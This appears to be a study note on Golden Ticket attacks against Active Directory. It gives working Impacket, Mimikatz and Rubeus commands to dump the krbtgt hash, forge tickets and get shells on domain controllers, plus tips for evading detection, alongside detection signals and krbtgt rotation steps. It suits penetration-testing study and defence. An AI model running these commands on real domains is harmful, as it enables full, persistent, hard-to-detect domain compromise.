# 📌 Golden Ticket & krbtgt Abuse

> Steal the one hash that signs every Kerberos ticket in the domain — then forge your own TGTs as any user, forever, and the KDC can't tell the difference.

---

## 🔍 Definition

A **Golden Ticket** is a forged Kerberos TGT (Ticket Granting Ticket) created using the **NTLM hash or AES key of the `krbtgt` account** — the domain's Kerberos service account whose key signs every legitimate TGT. With the `krbtgt` hash, an attacker can forge a TGT claiming to be any user with any group membership. The KDC validates TGTs by decrypting with the `krbtgt` hash — if it decrypts, it trusts it. The forged ticket is indistinguishable from a real one.

**MITRE T1558.001. This is domain persistence.** It doesn't disappear when passwords are reset. You must rotate `krbtgt` twice to invalidate it.

---

## 🧠 Core Concepts

- **krbtgt account** — special, non-interactive AD account. Its NTLM hash/AES key is used to encrypt and sign every TGT in the domain. Compromising it = owning Kerberos
- **TGT (Ticket Granting Ticket)** — credential proving identity to the KDC. Normally valid 10 hours, renewable 7 days. You can set Golden Ticket validity to years
- **PAC (Privilege Attribute Certificate)** — embedded in TGT. Contains user's group memberships (SIDs). In a Golden Ticket, you control the PAC — claim any groups you want, including Domain Admins (512), Schema Admins (518), Enterprise Admins (519)
- **Why it's undetectable** — the KDC only checks if the TGT decrypts correctly with `krbtgt`. It doesn't cross-reference whether the user or groups in the PAC are real. No AS-REQ logged on the DC since you didn't go through normal auth
- **Domain SID** — required to build the PAC. Easily obtained from any domain enum
- **Fictional username** — you can set any username. Real or fake. The RID matters more than the name for privilege
- **Persistence angle** — Golden Ticket works even after the targeted user's password is reset. Survives until `krbtgt` is rotated
- **DCSync prerequisite** — to get the `krbtgt` hash, you typically need DA already (via DCSync). Golden Ticket is therefore post-DA persistence and re-entry
- **Diamond/Sapphire Tickets** — stealthier variants. Diamond modifies a real TGT's PAC (requires `krbtgt` hash). Sapphire copies PAC from a real user via S4U2Self+U2U. Both generate legitimate AS-REQ events, making detection harder

---

## ⚙️ How It Works

**Getting the krbtgt hash:**
- Via **DCSync** (most common): mimic a DC replication request → KDC hands you all hashes including `krbtgt`
- Via **NTDS.dit dump**: copy the AD database from the DC → extract offline
- Via **LSASS dump on DC**: `krbtgt` is cached in LSASS on domain controllers

**Forging the ticket:**
1. Have: domain FQDN, domain SID, `krbtgt` NTLM hash (or AES key), username to impersonate, RID
2. Use Mimikatz/Impacket to generate a TGT signed with `krbtgt` hash, PAC claiming DA membership
3. Inject ticket into session (`/ptt` or `export KRB5CCNAME`)
4. Request TGS tickets for any service using the forged TGT → full domain access

> 💡 Unlike Silver Tickets (no KDC contact), Golden Tickets DO touch the KDC — the forged TGT is submitted in a TGS-REQ to get service tickets. But the DC trusts it because the signature validates.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| krbtgt | Service account whose hash signs all TGTs |
| DCSync | Imitate DC replication → dump `krbtgt` hash without LSASS access |
| Golden Ticket | Forged TGT with `krbtgt` hash — domain-wide access |
| Diamond Ticket | Modified real TGT with custom PAC — stealthier, requires `krbtgt` hash |
| Sapphire Ticket | Real TGT with PAC copied from real user via S4U — most stealthy |
| `/ptt` | Mimikatz flag: Pass-the-Ticket — inject directly into current session |
| `/endin` | Mimikatz flag: ticket lifetime in minutes (set to 600 = 10h to blend in) |
| `ticketer.py` | Impacket script for Golden and Silver ticket forging |
| SID history injection | Add extra group SIDs to PAC via `/sids` flag — extra privilege escalation |
| krbtgt rotation | Changing `krbtgt` password twice — only way to invalidate all Golden Tickets |

---

## 🔥 Important Details & Gotchas

- **Requires DA first** — getting `krbtgt` hash almost always needs domain admin level or DCSync rights. Golden Ticket is persistence after compromise, not a path to DA
- **krbtgt password history = 2** — you must reset the password **twice** to invalidate existing Golden Tickets. First reset → old hash still valid (it's in history). Second reset → both old and current invalidated
- **10-year ticket = detection trigger** — tools default to 10-year validity. A Kerberos ticket valid for 10 years is anomalous. Use realistic lifetimes: `/endin:600` (10 hours) to blend in
- **You can use non-existent usernames** — the ticket is validated against the signature, not the username. You can forge a TGT for `hacker` that has Domain Admin membership. Useful for operational security
- **SID History abuse** — Mimikatz's `/sids:S-1-5-21-...-519` adds Enterprise Admins SID to the PAC. Powerful in forest trust scenarios (cross-forest access)
- **AES-based Golden Tickets are stealthier** — RC4-based tickets (`/rc4`) can trigger MDI alerts on encryption downgrade. Use `/aes256` for better opsec. Requires the AES key from secretsdump output
- **Diamond Ticket** — forge by modifying a real TGT (requires `krbtgt` hash, but generates legitimate AS-REQ on DC). Harder to detect since the AS-REQ exists. Impacket ticketer with `/diamond` flag, or Rubeus `/diamond`

---

## 🌍 Real-World Usage / Examples

**Step 1: Get krbtgt hash (DCSync):**
```bash
# Impacket — from Kali (needs replication rights or DA creds)
impacket-secretsdump corp.local/domainadmin:pass@<DC-IP> -just-dc-user krbtgt

# Output:
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Mimikatz (on Windows with DA):
lsadump::dcsync /user:corp\krbtgt
# Look for: Hash NTLM: <hash> / aes256_hmac: <aes_key>

# Or dump NTDS.dit:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

**Step 2: Get Domain SID:**
```bash
impacket-lookupsid corp.local/user:pass@<DC-IP> | grep "Domain SID"
# S-1-5-21-XXXX-XXXX-XXXX

# Or from secretsdump output — it's listed in the header
# Or: nxc smb <DC-IP> -u user -p pass
```

**Step 3: Forge Golden Ticket (Impacket):**
```bash
# RC4 (NTLM hash)
impacket-ticketer \
  -nthash 8846f7eaee8fb117ad06bdd830b7586c \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  Administrator

# AES256 (stealthier — use if available)
impacket-ticketer \
  -aesKey <krbtgt_aes256_key> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -duration 600 \
  Administrator

# With SID history (extra groups — Enterprise Admins)
impacket-ticketer \
  -nthash <krbtgt_hash> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -extra-sid S-1-5-21-XXXX-XXXX-XXXX-519 \
  Administrator
```

**Step 4: Use the Golden Ticket:**
```bash
export KRB5CCNAME=Administrator.ccache

# Shell on DC
impacket-psexec -k -no-pass corp.local/Administrator@<DC-FQDN>
impacket-wmiexec -k -no-pass corp.local/Administrator@<DC-FQDN>

# DCSync (if not done already)
impacket-secretsdump -k -no-pass corp.local/Administrator@<DC-FQDN>

# Access any resource
impacket-smbexec -k -no-pass corp.local/Administrator@<server-FQDN>
```

**Forge Golden Ticket (Mimikatz — Windows):**
```cmd
# Dump krbtgt first
lsadump::dcsync /user:corp\krbtgt

# Forge and inject in one step
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /krbtgt:8846f7eaee8fb117ad06bdd830b7586c \
  /id:500 \
  /groups:512 \
  /endin:600 \
  /renewmax:10080 \
  /ptt

# Verify
klist
dir \\DC01.corp.local\c$
```

**Diamond Ticket (stealthier — real AS-REQ generated):**
```bash
# Rubeus (Windows)
.\Rubeus.exe diamond /krbkey:<krbtgt_aes256> \
  /user:lowprivuser /password:pass \
  /enctype:aes /domain:corp.local /dc:<DC-FQDN> \
  /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# Impacket ticketer with /diamond flag (newer versions)
```

**Invalidating Golden Tickets (Blue Team):**
```powershell
# Reset krbtgt password TWICE (12-24h apart for replication)
# Microsoft's KRBTGT reset script (recommended):
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# Manual:
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "Rand0mP@ss1!" -AsPlainText -Force)
# Wait 1-2 hours for replication
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "Rand0mP@ss2!" -AsPlainText -Force)
```

---

## 🕵️ Detection

| Signal | Details |
|--------|---------|
| TGT with no AS-REQ | Golden Ticket submitted to KDC for TGS without preceding AS-REQ from that IP. MDI detects this |
| Abnormal ticket lifetime | > 10 hours validity on a TGT. Event ID 4769 (TGS-REQ) without matching 4768 (AS-REQ) |
| Non-existent username in ticket | Username in TGS-REQ doesn't exist in AD |
| Event ID 4672 | Special privileges assigned — DA logon. Cross-correlate with 4768/4769 |
| krbtgt password change | Both changes should be expected during incident response |

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[Silver Ticket Attacks]]
- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[BloodHound & Attack Path Analysis]]
- [[Lateral Movement]]
- [[Shadow Credentials]]

---

## 📚 Sources / Further Reading

- [The Hacker Recipes — Golden Tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden) — Impacket ticketer full reference
- [Netwrix — Golden Ticket Attack](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-ticket-attack/) — detection + krbtgt rotation guide
- [CrowdStrike — Golden Ticket (Aug 2025)](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/golden-ticket-attack/) — current threat actor usage
- [Picus Security — T1558.001 Emulation](https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001) — Mimikatz + Impacket walkthrough
- [hackndo — Silver & Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/) — PAC internals explained
- KRBTGT Reset Script: `https://github.com/microsoft/New-KrbtgtKeys.ps1`
- MITRE ATT&CK: T1558.001
- HTB Machines: `Forest`, `Monteverde` (post-DA persistence)
